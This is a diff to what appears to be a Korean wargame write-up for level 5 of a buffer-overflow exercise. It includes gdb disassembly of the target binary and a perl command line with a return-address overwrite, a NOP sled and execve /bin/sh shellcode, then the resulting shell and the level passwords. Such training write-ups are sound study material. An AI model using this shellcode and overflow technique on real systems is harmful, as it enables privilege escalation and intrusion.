@@ -341,7 +341,129 @@ $
 알아낸 lv5 비번 : cheese toast
 ## lv 5
 gdb로 lv6가 무슨 프로그램인지 확인해보자.
+```
+   0x08048500 <+0>:	push   ebp
+   0x08048501 <+1>:	mov    ebp,esp
+   0x08048503 <+3>:	sub    esp,0x2c
+   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x0804850a <+10>:	jg     0x8048523 <main+35>
+   0x0804850c <+12>:	push   0x8048670
+   0x08048511 <+17>:	call   0x8048410 <printf@plt>
+   0x08048516 <+22>:	add    esp,0x4
+   0x08048519 <+25>:	push   0x0
+   0x0804851b <+27>:	call   0x8048420 <exit@plt>
+   0x08048520 <+32>:	add    esp,0x4
+   0x08048523 <+35>:	nop
+   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
+   0x0804852b <+43>:	nop
+   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
+   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
+   0x0804853a <+58>:	mov    eax,ds:0x80497a4
+   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
+   0x08048543 <+67>:	jne    0x8048547 <main+71>
+   0x08048545 <+69>:	jmp    0x8048587 <main+135>
+   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
+   0x08048551 <+81>:	mov    eax,ds:0x80497a4
+   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048559 <+89>:	push   edx
+   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
+   0x0804855f <+95>:	add    esp,0x4
+   0x08048562 <+98>:	mov    eax,eax
+   0x08048564 <+100>:	push   eax
+   0x08048565 <+101>:	push   0x0
+   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
+   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
+   0x08048571 <+113>:	mov    eax,ds:0x80497a4
+   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
+   0x08048579 <+121>:	push   edx
+   0x0804857a <+122>:	call   0x8048430 <memset@plt>
+   0x0804857f <+127>:	add    esp,0xc
+   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
+   0x08048585 <+133>:	jmp    0x8048530 <main+48>
+   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804858a <+138>:	add    eax,0x4
+   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]
+   0x0804858f <+143>:	add    edx,0x2f
+   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
+   0x08048595 <+149>:	je     0x80485b0 <main+176>
+   0x08048597 <+151>:	push   0x804867c
+   0x0804859c <+156>:	call   0x8048410 <printf@plt>
+   0x080485a1 <+161>:	add    esp,0x4
+   0x080485a4 <+164>:	push   0x0
+   0x080485a6 <+166>:	call   0x8048420 <exit@plt>
+   0x080485ab <+171>:	add    esp,0x4
+   0x080485ae <+174>:	mov    esi,esi
+   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485b3 <+179>:	add    eax,0x4
+   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
+   0x080485b8 <+184>:	push   edx
+   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>
+   0x080485be <+190>:	add    esp,0x4
+   0x080485c1 <+193>:	mov    eax,eax
+   0x080485c3 <+195>:	cmp    eax,0x30
+   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>
+   0x080485c8 <+200>:	push   0x8048699
+   0x080485cd <+205>:	call   0x8048410 <printf@plt>
+   0x080485d2 <+210>:	add    esp,0x4
+   0x080485d5 <+213>:	push   0x0
+   0x080485d7 <+215>:	call   0x8048420 <exit@plt>
+   0x080485dc <+220>:	add    esp,0x4
+   0x080485df <+223>:	nop
+   0x080485e0 <+224>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485e3 <+227>:	add    eax,0x4
+   0x080485e6 <+230>:	mov    edx,DWORD PTR [eax]
+   0x080485e8 <+232>:	push   edx
+   0x080485e9 <+233>:	lea    eax,[ebp-0x28]
+   0x080485ec <+236>:	push   eax
+   0x080485ed <+237>:	call   0x8048440 <strcpy@plt>
+   0x080485f2 <+242>:	add    esp,0x8
+   0x080485f5 <+245>:	lea    eax,[ebp-0x28]
+   0x080485f8 <+248>:	push   eax
+   0x080485f9 <+249>:	push   0x80486b0
+   0x080485fe <+254>:	call   0x8048410 <printf@plt>
+   0x08048603 <+259>:	add    esp,0x8
+   0x08048606 <+262>:	push   0x28
+   0x08048608 <+264>:	push   0x0
+   0x0804860a <+266>:	lea    eax,[ebp-0x28]
+   0x0804860d <+269>:	push   eax
+   0x0804860e <+270>:	call   0x8048430 <memset@plt>
+   0x08048613 <+275>:	add    esp,0xc
+   0x08048616 <+278>:	leave  
+   0x08048617 <+279>:	ret  
+```
+점점 더 길어지고있다.  
+무엇이 추가 되었나 확인해봤더니  
+```
+  0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x080485b3 <+179>:	add    eax,0x4
+   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
+   0x080485b8 <+184>:	push   edx
+   0x080485b9 <+185>:	call   0x80483f0 <strlen@plt>
+   0x080485be <+190>:	add    esp,0x4
+   0x080485c1 <+193>:	mov    eax,eax
+   0x080485c3 <+195>:	cmp    eax,0x30
+   0x080485c6 <+198>:	jbe    0x80485e0 <main+224>
+```
+argv[1]의 길이를 확인하는 명령어가 추가되었다.
 
+정확히 ret을 덮을 만큼의 길이만 허용하고있다.  
+그래서 이를 해결하기 위해 strlen은 문자열의 끝을 알려주는 공백문자는 길이에 포함시키지 않는 것을 이용한다.
+
+즉, 아래와 같이 코드를 짜면 해결 할 수 있다.
+```
+lv5@ubuntu:~$ ./lv6 `perl -e 'print "a"x44, "\xd0\xd3\xff\xff"'` `perl -e 'print "\x90"x200, "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
+$ whoami
+lv6
+$ id
+uid=1006(lv6) gid=1005(lv5) groups=1005(lv5)
+$ my-pass
+still easy
+$ 
+```
+알아낸 lv6 비번 : still easy
 ## lv 6
 ## lv 7
 ## lv 8
